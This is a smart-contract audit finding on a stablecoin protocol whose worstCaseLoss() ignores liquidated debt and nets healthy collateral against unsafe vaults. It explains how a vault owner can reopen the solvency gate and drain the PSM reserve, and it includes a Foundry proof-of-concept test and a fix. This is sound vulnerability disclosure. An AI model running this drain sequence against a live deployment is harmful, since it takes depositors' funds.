# [C-01] `SolvencyEngine.worstCaseLoss()` understates the protocol's loss,  allowing the stable reserve to be drained

## Summary

`SolvencyEngine.worstCaseLoss()` is meant to be the most the protocol could lose in a crisis, and the solvency gate blocks PSM redemptions once it exceeds 90% of the stable reserve. It only reads the aggregate `globalArt` and `globalInk` of vaults that have not been liquidated, so it ignores debt that liquidation moves into the Balance Sheet's `sin` and lets a healthy vault's surplus collateral offset an unsafe vault's shortfall. As a result, once an unsafe vault is liquidated the gate opens again while the protocol is still insolvent, and USDR that is no longer fully backed, most profitably the liquidated vault owner's own borrowed USDR, can be redeemed 1:1 to drain the PSM reserve ahead of other depositors.

---

## Root Cause

`worstCaseLoss()` is meant to be the most the protocol could lose in a crisis. To compute it, the function iterates over every registered volatile `ilkId` and reads that ilk's `globalArt` and `globalInk` from the `VaultEngine`, i.e. the totals of all vaults of the ilk that have **not** been liquidated. From these it derives `ilkDebt` and `recoverable`, and the ilk only contributes to `loss` when `ilkDebt > recoverable`:

`SolvencyEngine.sol::worstCaseLoss()#L254-L277`
```solidity
(uint256 globalArt, uint256 globalInk, uint256 rate, , , , , ) = VAULT_ENGINE.ilks(ilkId);
uint256 ilkDebt = (globalArt * rate) / _RAY;
...
collateralValue = (globalInk * uint256(val)) / _WAD;
uint256 recoverable = (((collateralValue * stressMarkdown) / _WAD) * stressDepth) / _WAD;

if (ilkDebt > recoverable) {
    loss += ilkDebt - recoverable;
}
```

This formula has two independent flaws.

**1. Liquidated vaults are left out.** The worst-case loss has to cover all of the protocol's risk, but the vaults that were liquidated because they became unsafe, which are exactly the riskiest ones, are missing from it. When `LiquidationTrigger.bark()` seizes an unsafe vault, `grab` removes the vault's `ink` and `art` from `globalInk` and `globalArt`: the collateral is transferred to the `DutchAuction`, and the debt is booked as `VaultEngine.sin[balanceSheet]`:

`LiquidationTrigger.sol::bark()#L260-L264`
```solidity
VAULT_ENGINE.grab(vaultId, milk.clip, address(balanceSheet), -int256(dink), -int256(dart));
uint256 due = dart * rate;
balanceSheet.fess(due);
```

Nothing is repaid; the liability only moves from `globalArt`, which `worstCaseLoss()` reads, to `sin`, which it never reads. The same amount is added to `VaultEngine.vice`, the system-wide total of bad debt, which `worstCaseLoss()` does not read either. The keeper reward minted through `suck` in `DutchAuction.kick()` (`DutchAuction.sol::kick()#L224`) is booked as `sin` as well, and neither the collateral under auction nor the outstanding `tab` is considered. The debt disappears from the metric at the moment of liquidation, and whatever the auction fails to recover is never reflected.

**2. `recoverable` is computed from the ilk-wide `globalInk`.** `globalInk` is the sum of the collateral of every vault in the ilk, but each vault has its own health and its own collateral. Treating the whole sum as recoverable lets the formula compute `max(0, Σ debt_i − Σ stressedCollateral_i)` instead of `Σ max(0, debt_i − stressedCollateral_i)`. Every vault stands on its own: `grab(vaultId, ...)` only seizes that vault's own collateral, and a healthy vault's owner can withdraw their surplus at any time. A well-collateralized vault's collateral can never be used to settle an unsafe vault's debt, yet the formula counts it as if it could.

---

## Impact

`worstCaseLoss()` is consumed by `SolvencyEngine.checkInvariant()`, which sets `breached = true` when the loss exceeds 90% of the reserve (`reserveFactor`):

`SolvencyEngine.sol::checkInvariant()#L203-L224`
```solidity
loss = worstCaseLoss();
reserve = RESERVE_ACCOUNTING.totalReserve();
...
breached = loss > (reserve * reserveFactor) / _WAD;
...
RESERVE_ACCOUNTING.updateCommittedEscrow(loss > reserve ? reserve : loss);
```

Because `loss` is understated, `breached` is not set when the gate should close. As a result, the functions that recompute the invariant and then read `isBreached()`, `PegStabilityModule.buyStable()`, `VaultEngine.frob()` and `BalanceSheet.distributeSurplus()`, keep allowing PSM redemptions, risk-increasing vault operations and surplus distribution while the protocol is insolvent.

The most direct consequence is a run on the PSM reserve while the protocol is insolvent. After a price crash leaves a vault unsafe, the gate closes as intended. But anyone can call the permissionless `bark`, and once the vault's debt is moved into `sin` the shortfall is no longer counted, so the next `buyStable` call opens the gate again. The USDR minted against that vault is no longer fully backed: its collateral is worth less than the debt and sits in the auction. Yet every unit of it can still be redeemed 1:1 for the stablecoins deposited by PSM users, first come first served, until the reserve is empty.

The owner of the unsafe vault has the strongest incentive to do this. To get the collateral back, the owner would have to repay the full debt in USDR, yet that collateral is now worth less than the debt, so repaying means paying more than they get back. If they abandon the vault instead and redeem the borrowed USDR 1:1 at the PSM, they receive its full face value. Because the owner can call `bark` themselves, they also choose the moment the gate reopens and can redeem before anyone else reacts. Depositors who come later are left holding USDR that can no longer be redeemed. Any debt the auction fails to recover stays in `sin` as bad debt that is never counted, so the gate never closes again. This results in direct theft of depositors' funds and leaves the protocol insolvent.

The same understated `loss` is also written into `committedEscrow`, the part of the reserve held back for guaranteed obligations. `freeSlack`, the maximum amount `buyStable` can pay out, is the reserve minus this escrow:

`ReserveAccounting.sol::freeSlack()#L87-L90`
```solidity
function freeSlack() external view returns (uint256) {
    return totalReserve - committedEscrow;
}
```

Because `committedEscrow` is too low, `freeSlack` is too high, so more of the reserve can be redeemed than should be. The part that should stay locked to cover the loss can be withdrawn as well.

---

## Proof of Concept

The first test shows that liquidation hides the debt and lets the reserve be drained, and the second test shows that a healthy vault hides an unsafe vault's shortfall in the same ilk.

`test_sinExcludedFromWorstCaseLossDrainsReserve` shows that liquidation removes the debt from `worstCaseLoss()` and reopens the gate:

1. The RAIN price crashes, leaving `edgeVault` under-collateralized, and the gate closes.
2. `bark` liquidates `edgeVault`. Its debt moves into `sin` and `vice`, `worstCaseLoss()` drops to zero, and the gate reopens.
3. `edgeVaultUser` exits its borrowed USDR and redeems it through `buyStable`, taking the entire PSM reserve.
4. `psmUser` then tries to redeem its own deposit, and `buyStable` reverts with `InsufficientFreeSlack`.
5. The keeper buys the whole auction lot and the proceeds `heal` part of the `sin`. The unrecovered bad debt stays in `sin` and `vice`, yet the gate stays open.

`test_ilkAggregationHidesBreach` shows that a healthy vault in the same ilk hides the unsafe vault's shortfall:

1. With `edgeVault` alone in the RAIN ilk, the price crash closes the gate. The state is then reverted.
2. `healthyVaultUser` opens a heavily over-collateralized RAIN vault and the same crash is applied. Its collateral offsets `edgeVault`'s shortfall, so the gate stays open.
3. `healthyVaultUser` withdraws most of its surplus collateral through `frob`, which is allowed because the gate is open.
4. Once that collateral is gone, the gate closes again, showing it never covered `edgeVault`'s debt.

Create a new file `tests/WorstCaseLossUnderstatesLossExposure.t.sol` and paste the code below into it:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.30;

import { BaseTest } from "./shared/BaseTest.sol";
import { IPegStabilityModule } from "../contracts/interfaces/IPegStabilityModule.sol";
import { _RAY, _USDR_ILK, _WAD } from "../contracts/shared/Constants.sol";

contract WorstCaseLossUnderstatesLossExposureTest is BaseTest {
    // healthyVaultUser's RAIN vault: 200,000 RAIN backing 1,000 USDR -> 20,000% CR at $1.
    uint256 internal constant HEALTHY_VAULT_INK = 200_000 * _WAD;
    uint256 internal constant HEALTHY_VAULT_ART = 1_000 * _WAD;

    // edgeVaultUser's RAIN vault: 40,000 RAIN backing 10,000 USDR -> exactly 400% CR at $1 (mat = 400%).
    uint256 internal constant EDGE_VAULT_INK = 40_000 * _WAD;
    uint256 internal constant EDGE_VAULT_ART = 10_000 * _WAD;

    // Stable reserve seeded through the PSM: 5,000 USDT (6 decimals) -> 5,000 USDR.
    uint256 internal constant PSM_USER_USDT = 5_000 * 1e6;

    // USDT the keeper holds to buy auctioned collateral.
    uint256 internal constant KEEPER_USDT = 8_400 * 1e6;

    address internal healthyVaultUser = makeAddr("healthyVaultUser"); // heavily over-collateralized RAIN vault
    address internal edgeVaultUser = makeAddr("edgeVaultUser"); // RAIN vault opened right at the 400% mat line
    address internal psmUser = makeAddr("psmUser"); // deposits USDT into the PSM (the stable reserve)

    uint256 internal edgeVault;

    function setUp() public override {
        super.setUp();

        // Healthy RAIN price so the edge vault can be opened.
        _setRainPrice(1 * _WAD);

        // edgeVaultUser opens a RAIN vault at the mat edge.
        edgeVault = _openVault(edgeVaultUser, EDGE_VAULT_INK, EDGE_VAULT_ART);

        // psmUser deposits USDT into the PSM, seeding the stable reserve.
        usdt.mint(psmUser, PSM_USER_USDT);
        vm.startPrank(psmUser);
        usdt.approve(address(psm), PSM_USER_USDT);
        psm.sellStable(USDT_ILK, psmUser, PSM_USER_USDT);
        vm.stopPrank();

        // Fund the keeper.
        usdt.mint(keeper, KEEPER_USDT);
    }

    function test_sinExcludedFromWorstCaseLossDrainsReserve() public {
        // Crash RAIN.
        _setRainPrice(0.2e18);
        solvencyEngine.checkInvariant();
        assertEq(solvencyEngine.worstCaseLoss(), 8_600 * _WAD, "worstCaseLoss before bark");
        assertTrue(solvencyEngine.breached(), "breach not triggered");

        // Liquidate the edge vault.
        uint256 barkEra = vm.getBlockTimestamp();
        uint256 auctionId = liquidationTrigger.bark(edgeVault, keeper);

        // The seized debt sits in sin and vice, yet worstCaseLoss drops to zero and the breach lifts.
        solvencyEngine.checkInvariant();
        // sin also holds the keeper reward minted at kick, so it is at least the edge vault's debt.
        assertGe(vaultEngine.sin(address(balanceSheet)), EDGE_VAULT_ART * _RAY, "edge debt not in sin");
        assertGe(vaultEngine.vice(), EDGE_VAULT_ART * _RAY, "edge debt not in vice");
        assertEq(solvencyEngine.worstCaseLoss(), 0, "worstCaseLoss after bark");
        assertFalse(solvencyEngine.breached(), "breach not lifted");

        // edgeVaultUser redeems its borrowed USDR for the whole reserve.
        vm.startPrank(edgeVaultUser);
        vaultEngine.hope(address(collateralAdapter));
        collateralAdapter.exit(_USDR_ILK, edgeVaultUser, PSM_USER_USDT * 1e12);
        usdr.approve(address(psm), PSM_USER_USDT * 1e12);
        psm.buyStable(USDT_ILK, edgeVaultUser, PSM_USER_USDT);
        vm.stopPrank();
        assertEq(usdt.balanceOf(edgeVaultUser), PSM_USER_USDT, "edgeVaultUser redeemed amount");

        // psmUser can no longer redeem any of its deposit.
        vm.startPrank(psmUser);
        usdr.approve(address(psm), 1e18);
        vm.expectRevert(IPegStabilityModule.InsufficientFreeSlack.selector);
        psm.buyStable(USDT_ILK, psmUser, 1e6);
        vm.stopPrank();

        // keeper swaps its USDT into USDR through the PSM.
        vm.startPrank(keeper);
        usdt.approve(address(psm), KEEPER_USDT);
        psm.sellStable(USDT_ILK, keeper, KEEPER_USDT);
        collateralAdapter.join(_USDR_ILK, keeper, KEEPER_USDT * 1e12);

        // keeper buys the whole lot at the starting price.
        (, uint256 startingPrice, uint256 lot, ) = dutchAuction.getStatus(auctionId);
        vaultEngine.hope(address(dutchAuction));
        dutchAuction.take(auctionId, lot, startingPrice, keeper, "");
        vm.stopPrank();

        // The balance sheet heals the auction proceeds against the queued sin.
        balanceSheet.flog(barkEra);
        balanceSheet.heal(vaultEngine.usdr(address(balanceSheet)));

        // The unrecovered bad debt stays in sin and vice, and worstCaseLoss still ignores it.
        solvencyEngine.checkInvariant();
        assertEq(vaultEngine.sin(address(balanceSheet)), 1_826 * _WAD * _RAY, "bad debt after auction");
        assertEq(vaultEngine.vice(), 1_826 * _WAD * _RAY, "system bad debt after auction");
        assertEq(solvencyEngine.worstCaseLoss(), 0, "worstCaseLoss after auction");
        assertFalse(solvencyEngine.breached(), "breach after auction");
    }

    function test_ilkAggregationHidesBreach() public {
        uint256 snapshot = vm.snapshotState();

        // Crash RAIN with only the edge vault in the ilk.
        _setRainPrice(0.2e18);
        solvencyEngine.checkInvariant();
        uint256 worstCaseLossEdgeOnly = solvencyEngine.worstCaseLoss();
        assertEq(worstCaseLossEdgeOnly, 8_600 * _WAD, "worstCaseLoss edge only");
        assertTrue(solvencyEngine.breached(), "breach not triggered edge only");

        vm.revertToState(snapshot);

        // healthyVaultUser opens a RAIN vault in the same ilk.
        uint256 healthyVault = _openVault(healthyVaultUser, HEALTHY_VAULT_INK, HEALTHY_VAULT_ART);

        // Crash RAIN with the healthy vault in the ilk.
        _setRainPrice(0.2e18);
        solvencyEngine.checkInvariant();

        // The unrelated healthy vault lowers worstCaseLoss below the breach threshold and lifts the breach.
        assertEq(solvencyEngine.worstCaseLoss(), 2_600 * _WAD, "worstCaseLoss");
        assertFalse(solvencyEngine.breached(), "breach not hidden");

        // healthyVaultUser withdraws its surplus collateral while the breach is hidden.
        uint256 healthySurplusInk = 180_000 * _WAD;
        vm.prank(healthyVaultUser);
        vaultEngine.frob(healthyVault, healthyVaultUser, healthyVaultUser, -int256(healthySurplusInk), 0);
        (uint256 healthyInk, ) = vaultEngine.urns(healthyVault);
        assertEq(healthyInk, HEALTHY_VAULT_INK - healthySurplusInk, "healthy vault ink");

        // Without that surplus the breach reappears.
        solvencyEngine.checkInvariant();
        assertEq(solvencyEngine.worstCaseLoss(), 8_900 * _WAD, "worstCaseLoss after withdrawal");
        assertTrue(solvencyEngine.breached(), "breach not restored");
    }

    // ---------- HELPERS ----------

    /// @dev Pushes `price` [wad] through the OSM (two pokes, one HOP apart) and into the Vault Engine's spot.
    function _setRainPrice(uint256 price) internal {
        rainPriceSource.setPrice(price);
        vm.warp(((vm.getBlockTimestamp() / 1800) + 2) * 1800);
        osm.poke(RAIN_ILK);
        vm.warp(vm.getBlockTimestamp() + 3600);
        osm.poke(RAIN_ILK);
        priceConverter.poke(RAIN_ILK);
    }

    /// @dev Opens a fresh RAIN vault for `who` with `ink` collateral and `art` debt.
    function _openVault(address who, uint256 ink, uint256 art) internal returns (uint256 vaultId) {
        rain.mint(who, ink);

        vm.startPrank(who);
        rain.approve(address(collateralAdapter), ink);
        collateralAdapter.join(RAIN_ILK, who, ink);
        vaultId = vaultEngine.open(RAIN_ILK, who);
        vaultEngine.frob(vaultId, who, who, int256(ink), int256(art));
        vm.stopPrank();
    }
}
```

---

## Recommendation

`worstCaseLoss()` should keep counting a vault's debt after it is liquidated, and should not let one vault's surplus offset another vault's shortfall. For the liquidated debt, `worstCaseLoss()` can add the bad debt the Balance Sheet has not yet covered to `loss`. `SolvencyEngine` does not store the Balance Sheet's address yet, so a `balanceSheet` address parameter has to be added and set through `file`:

```diff
  function worstCaseLoss() public view returns (uint256 loss) {
             if (ilkDebt > recoverable) {
                 loss += ilkDebt - recoverable;
             }
         }
 
+        // Adding the debt that liquidation moved out of the vaults and the Balance Sheet has not yet covered
+        if (balanceSheet != address(0)) {
+            uint256 badDebt = VAULT_ENGINE.sin(balanceSheet);
+            uint256 surplus = VAULT_ENGINE.usdr(balanceSheet);
+
+            if (badDebt > surplus) {
+                loss += (badDebt - surplus) / _RAY;
+            }
+        }
+

```

This keeps a liquidated vault's full debt in the metric from the moment of `bark` until the auction proceeds reach the Balance Sheet, and any part the auction fails to recover stays counted. Alternatively, `VAULT_ENGINE.vice()`, the system-wide total of bad debt, can be added to `loss` without any new parameter; it does not net the Balance Sheet's surplus against the bad debt, so it is the more conservative choice. For the aggregation, the exact fix is to sum each vault's own shortfall, `Σ max(0, debt_i − stressedCollateral_i)`. This is possible, but `worstCaseLoss()` would have to loop over every vault of every volatile ilk, and it runs inside every `buyStable` call and every risk-increasing `frob`, so its gas cost grows with the number of vaults and can make redemptions and vault operations very expensive. If exact per-vault accounting is not feasible, the approximation can at least be hedged with more conservative parameters: lowering `reserveFactor` (and, if needed, `stressMarkdown` and `stressDepth`) through `file` makes the gate trigger earlier, offsetting part of the understatement. This is only a mitigation, since a large enough healthy vault can still hide any shortfall.
